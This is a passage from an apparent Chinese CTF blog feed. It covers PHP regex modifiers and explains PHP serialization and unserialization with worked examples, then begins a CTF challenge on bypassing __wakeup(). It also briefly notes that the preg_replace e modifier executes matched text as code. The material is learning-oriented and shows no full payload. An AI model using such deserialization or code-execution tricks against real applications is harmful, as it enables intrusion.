class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;正则表达式<span class="subst">&#123;$pattern&#125;</span>和字符串<span class="subst">&#123;$string&#125;</span>匹配失败&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">正则表达式/.*&lt;\/b&gt;/和字符串welcome to phpfuns匹配成功</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; welcome to phpfuns )</span><br></pre></td></tr></table></figure></div>

<p>本意是只匹配第一个 <code>&lt;b&gt;welcome&lt;/b&gt;</code><br>但是结果却匹配了 <code>welcome to phpfuns</code> 整个字符串</p>
<p>如何取消贪婪模式<br>我们可以使用 <code>模式修正符U</code> 和 <code>元字符?</code> 两种方式取消正则表达式的贪婪模式。</p>
<h3 id="U"><a href="#U" class="headerlink" title="U"></a>U</h3><p>U：只匹配最近的一个字符串，不重复匹配</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/&lt;b&gt;.*&lt;\/b&gt;/U&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;&lt;b&gt;welcome&lt;/b&gt; &lt;b&gt;to&lt;/b&gt; &lt;b&gt;phpfuns&lt;/b&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$arr</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;正则表达式&lt;b&gt;<span class="subst">&#123;$pattern&#125;</span>&lt;/b&gt;和字符串&lt;b&gt;<span class="subst">&#123;$string&#125;</span>&lt;/b&gt;匹配成功&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;正则表达式<span class="subst">&#123;$pattern&#125;</span>和字符串<span class="subst">&#123;$string&#125;</span>匹配失败&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span>   </span><br><span class="line"></span><br><span class="line">正则表达式/.*&lt;\/b&gt;/U和字符串welcome to phpfuns匹配成功</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; welcome )</span><br></pre></td></tr></table></figure></div>



<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/&lt;b&gt;.*?&lt;\/b&gt;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;&lt;b&gt;welcome&lt;/b&gt; &lt;b&gt;to&lt;/b&gt; &lt;b&gt;phpfuns&lt;/b&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$arr</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;正则表达式&lt;b&gt;<span class="subst">&#123;$pattern&#125;</span>&lt;/b&gt;和字符串&lt;b&gt;<span class="subst">&#123;$string&#125;</span>&lt;/b&gt;匹配成功&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;正则表达式<span class="subst">&#123;$pattern&#125;</span>和字符串<span class="subst">&#123;$string&#125;</span>匹配失败&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">正则表达式/.*?&lt;\/b&gt;/和字符串welcome to phpfuns匹配成功</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; welcome )</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="修正符-D"><a href="#修正符-D" class="headerlink" title="修正符 D"></a>修正符 D</h2><p>如果使用 <code>$</code> 限制结尾字符,则不允许结尾有换行</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模式为:$mode=&quot;/abc$/&quot;; </span><br><span class="line">可以与最后有换行的$str=&quot;adshabc\n&quot;匹配; </span><br><span class="line">元子符$会忽略最后的换行\n; </span><br><span class="line">如果模式为:$mode=&quot;/abc/D&quot;, </span><br><span class="line">则不能与$str=&quot;adshabc\n&quot;匹配, </span><br><span class="line">修正符D限制其不可有换行;必需以abc结尾; </span><br></pre></td></tr></table></figure></div>

<h2 id="修正符-e"><a href="#修正符-e" class="headerlink" title="修正符 e"></a>修正符 e</h2><p>配合函数 <code>preg_replace()</code> 使用，可以把匹配来的字符串当作正则表达式执行</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/forest_fire/article/details/50944901">正则表达式中模式修正符作用详解</a><br><a href="http://www.360doc.com/content/18/0816/09/57605256_778653884.shtml">正则表达式中常用的模式修正符</a></p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈PHP序列化和反序列化</title>
    <url>/yakko117/2019/03/03/%E6%B5%85%E8%B0%88PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自己挖的坑，哭着也要填完<br>(ps:参考了无数大佬的文章 做了个归纳总结，后面也会慢慢把自己的积累记录下来)</p>
<hr>
<h1 id="serialize：序列化"><a href="#serialize：序列化" class="headerlink" title="serialize：序列化"></a>serialize：序列化</h1><h2 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h2><p>在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。<br>序列化函数原型如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">serialize</span> ( <span class="keyword">mixed</span> <span class="variable">$value</span> )</span><br></pre></td></tr></table></figure></div>

<p>套用悠悠大佬的一个栗子</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mana</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$pass</span></span>) //创造一个返回表示数据的对象</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$number</span> = <span class="number">16</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;Manayakko&#x27;</span>;</span><br><span class="line"><span class="variable">$bool</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$null</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">2</span>);</span><br><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title class_">Mana</span>(<span class="string">&#x27;yakko&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$number</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$bool</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$null</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p> <code>__construct()</code> 函数创建一个新的 SimpleXMLElement 对象。<br>如果成功，则该函数返回一个对象。如果失败，则返回 false。<br>返回值：返回一个表示数据的 SimpleXMLElement 对象。</p>
</blockquote>
<p>输出结果如下</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0pry62ox6j30l606zgmy.jpg" data-fancybox="group" data-caption="2php" class="fancybox"><img alt="2php" title="2php" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0pry62ox6j30l606zgmy.jpg" class="lazyload"></a></p>
<hr>
<h2 id="所以序列化对于不同类型得到的字符串格式为："><a href="#所以序列化对于不同类型得到的字符串格式为：" class="headerlink" title="所以序列化对于不同类型得到的字符串格式为："></a>所以序列化对于不同类型得到的字符串格式为：</h2><ul>
<li><code>String</code> : s:size:value;</li>
<li><code>Integer</code> : i:value;</li>
<li><code>Boolean</code> : b:value;(保存1或0)</li>
<li><code>Null</code> : N;</li>
<li><code>Array</code> : a:size:{key definition;value definition;(repeated per element)}</li>
<li><code>Object</code> : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</li>
</ul>
<hr>
<p>一开始不能理解，没关系，简单解释</p>
<pre><code>serialize 把一个对象转成字符串形式， 可以用于保存
</code></pre>
<hr>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">F</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;a.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;filename.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure></div>
<p>上面栗子是创建一个类，并输出filename的值，最后输出序列化字符串:</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0pry60xb6j30cn04saa8.jpg" data-fancybox="group" data-caption="2php" class="fancybox"><img alt="2php" title="2php" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0pry60xb6j30cn04saa8.jpg" class="lazyload"></a></p>
<p>关于这一串：</p>
<blockquote>
<p>O:1:”F”:1:{s:8:”filename”;s:5:”a.txt”;}</p>
</blockquote>
<p>简单解释：<br>O : 对象， 1 对象名长度 （就是 <code>F</code> ）<br>S ：字符串， 8 就是字符串长度，<code>fliename</code> 为字符串定义时的名字（后面的同理）<br>这里可以看到，我代码里的类定义为: <code>class F</code>，这个序列化就是 F，我定义变量名字是filename，它这里也是 filename, 我们可以修改看看:</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0pry62qj3j30qk0c10u2.jpg" data-fancybox="group" data-caption="2_1php" class="fancybox"><img alt="2_1php" title="2_1php" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0pry62qj3j30qk0c10u2.jpg" class="lazyload"></a></p>
<p>可以看到序列化后的变量名字变成 <code>filenameF</code> 了。</p>
<hr>
<h2 id="序列化对象"><a href="#序列化对象" class="headerlink" title="序列化对象"></a>序列化对象</h2><p>从上面的例子中可以看出<strong>序列化对象只会保存属性值</strong>。</p>
<ul>
<li>那么对象中的常量是否会保存？</li>
<li>继承时，父类的变量是否会保存？</li>
</ul>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Xiaohei</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xh_data</span> = <span class="string">&#x27;xh&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mana</span> <span class="keyword">extends</span> <span class="title">Xiaohei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$pass</span></span>)  //创建一个返回数据的对象</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPass</span>(<span class="params"><span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cc</span> = <span class="keyword">new</span> <span class="title class_">Mana</span>(<span class="string">&#x27;yakko&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cc</span>));</span><br></pre></td></tr></table></figure></div>
<p>返回值如下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string(83) &quot;O:4:&quot;Mana&quot;:3:&#123;s:4:&quot;data&quot;;s:5:&quot;yakko&quot;;s:10:&quot; Mana pass&quot;;b:1;s:7:&quot;xh_data&quot;;s:2:&quot;xh&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure></div>
<p>在序列化对象时，不会保存常量的值。对于父类中的变量，则会保留。</p>
<hr>
<h2 id="序列化对象自定义"><a href="#序列化对象自定义" class="headerlink" title="序列化对象自定义"></a>序列化对象自定义</h2><p>在序列化 <strong>对象</strong> 的时候，对于 <strong>对象</strong> 的一些敏感属性，我们不需保存，但应该如何处理？<br>当调用 <code>serialize()</code> 函数序列化对象时，该函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>，如果存在，该方法会先被调用，然后才执行序列化操作。<br>可以通过重载这个方法，从而自定义序列化行为。该方法原型如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public array __sleep ( void )</span><br></pre></td></tr></table></figure></div>

<ul>
<li>该方法返回一个包含对象中所有应被序列化的变量名称的数组</li>
<li>该方法未返回任何内容，则 NULL 被序列化，并产生一个 <code>E_NOTICE</code> 级别的错误</li>
<li><code>__sleep()</code> 不能返回父类的私有成员的名字。这样做会产生一个 <code>E_NOTICE</code> 级别的错误。这时只能用 <code>Serializable</code> 接口来替代。</li>
<li>常用于保存那些大对象时的清理工作，避免保存过多冗余数据</li>
</ul>
<h2 id="看下面的例子：返回结果如下，显然序列化的时候忽略了-password-字段的值。"><a href="#看下面的例子：返回结果如下，显然序列化的时候忽略了-password-字段的值。" class="headerlink" title="看下面的例子：返回结果如下，显然序列化的时候忽略了 password 字段的值。"></a>看下面的例子：<br><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;yakko&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$another</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$another</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;another = <span class="variable">$another</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 重载序列化调用的方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 返回需要序列化的变量名，过滤掉password变量</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;another&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;manayakko&#x27;</span>, <span class="string">&#x27;yakko&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br></pre></td></tr></table></figure></div><br>返回结果如下，显然序列化的时候忽略了 password 字段的值。<br><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string(72) &quot;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:9:&quot;manayakko&quot;;s:7:&quot;another&quot;;s:5:&quot;yakko&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure></div></h2><h2 id="序列化对象存储"><a href="#序列化对象存储" class="headerlink" title="序列化对象存储"></a>序列化对象存储</h2><p>通过上面的介绍，我们可以把一个复制的对象或者数据序列化成一个序列字符串，保存值的同事还保存了他们的结构。<br>我们可以把序列化之后的值保存起来，存在文件或者缓存里面。不推荐存在数据库里面，可读性查，而且不便于迁移维护，不便于查询。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;manayakko&#x27;</span>, <span class="string">&#x27;yakko&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line">    <span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line">    <span class="comment">// 保存在本地</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;user.ser&#x27;</span>, <span class="variable">$ser</span>);</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="unserialize：反序列化"><a href="#unserialize：反序列化" class="headerlink" title="unserialize：反序列化"></a>unserialize：反序列化</h1><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>通过上面的讲解，我们可以将对象序列化为字符串并保存起来，那么如何把这些序列化后的字符串恢复成原样呢？PHP提供了反序列函数：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mixed unserialize ( string $str )</span><br></pre></td></tr></table></figure></div>
<p> <code>unserialize()</code> 反序列化函数用于将单一的已序列化的变量转换回 PHP 的值。</p>
<ul>
<li>如果传递的字符串不可解序列化，则返回 <code>FALSE</code>，并产生一个 <code>E_NOTICE</code></li>
<li>返回的是转换之后的值，可为 <code>integer</code>、<code>float</code>、<code>string</code>、<code>array</code> 或 <code>object</code></li>
<li>若被反序列化的变量是一个对象，在成功重新构造对象之后，PHP会自动地试图去调用<code>__wakeup()</code>成员函数（如果存在的话）</li>
</ul>
<p>看下面的例子：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$another</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$another</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>; <span class="comment">//类中定义的局部变量</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;another = <span class="variable">$another</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义反序列化后调用的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$xiaohei</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:9:&quot;manayakko&quot;;s:7:&quot;another&quot;;s:5:&quot;yakko&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$xiaohei</span>));<span class="keyword">echo</span><span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$Arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;xiaohei&#x27;</span>,<span class="string">&#x27;goza&#x27;</span>,<span class="string">&#x27;yakko&#x27;</span>);</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Arr</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$new</span>);<span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$new</span>));</span><br></pre></td></tr></table></figure></div>
<p>输出结果为：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">object</span>(User)<span class="comment">#1 (4) &#123;</span></span><br><span class="line">  [<span class="string">&quot;username&quot;</span>]=&gt;<span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;manayakko&quot;</span></span><br><span class="line">  [<span class="string">&quot;another&quot;</span>]=&gt;<span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;yakko&quot;</span></span><br><span class="line">  [<span class="string">&quot;password:private&quot;</span>]=&gt;<span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;manayakko&quot;</span></span><br><span class="line">  [<span class="string">&quot;order:private&quot;</span>]=&gt;<span class="literal">NULL</span> &#125;</span><br><span class="line">  </span><br><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">7</span>:<span class="string">&quot;xiaohei&quot;</span>;i:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">&quot;goza&quot;</span>;i:<span class="number">2</span>;s:<span class="number">5</span>:<span class="string">&quot;yakko&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; xiaohei</span><br><span class="line">        [<span class="number">1</span>] =&gt; goza</span><br><span class="line">        [<span class="number">2</span>] =&gt; yakko )</span><br></pre></td></tr></table></figure></div>

<p>可以得出以下结论：</p>
<ul>
<li><code>__wakeup()</code> 函数在对象被构建以后执行，所以$this-&gt;username的值不为空</li>
<li>在调用 <code>__wakeUp()</code> 方法，对象会建立在序列化时未能保留的各种状态。</li>
<li>反序列化时，会尽量将变量值进行匹配并复制给序列化后的对象</li>
</ul>
<p>此时可以理解<strong>序列化与反序列化</strong>是将复杂的数据类型压缩成一个字符串 </p>
<blockquote>
<p><strong>serialize()</strong> 把变量和它们的值编码成文本形式<br><strong>unserialize()</strong> 恢复原先变量  </p>
</blockquote>
<hr>
<h2 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过 __wakeup()"></a>绕过 __wakeup()</h2><p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html">参考文档</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure></div>

<p>对于该题，先可以看到 <code>类test</code> 中有 <code>flag变量</code>，并调用了<code>__wakeup()</code>，则考虑实例化<code>test类</code> 并将其变量序列化。并猜测意图为将序列化结果输入在 <code>?code=</code> 后进行POST请求。</p>
